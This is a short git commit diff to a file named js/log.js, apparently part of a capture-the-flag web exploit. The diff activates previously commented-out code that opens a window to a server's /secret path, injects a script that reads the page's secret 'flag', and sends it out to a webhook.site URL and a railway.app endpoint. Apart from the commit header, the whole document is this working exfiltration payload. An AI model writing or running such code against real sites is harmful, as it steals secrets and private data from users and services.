aead30381f71a984c308eb93b225ed3313e7b7fe
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-17 10:53:50 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,5 +1,6 @@
-//let value = window.open('http://20.235.243.131:8443/secret');
-//value.window.onload=()=>{
-//    value.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location = "https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag;})</script>');
+let value = window.open('http://20.235.243.131:8443/secret');
+value.window.onload=()=>{
+value.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location = "https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag;})</script>');
 //window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=BOT_TESTING_SUCCESS";}
-window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=BOT_TESTING_SUCCESS"
+//window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=BOT_TESTING_SUCCESS"
+}
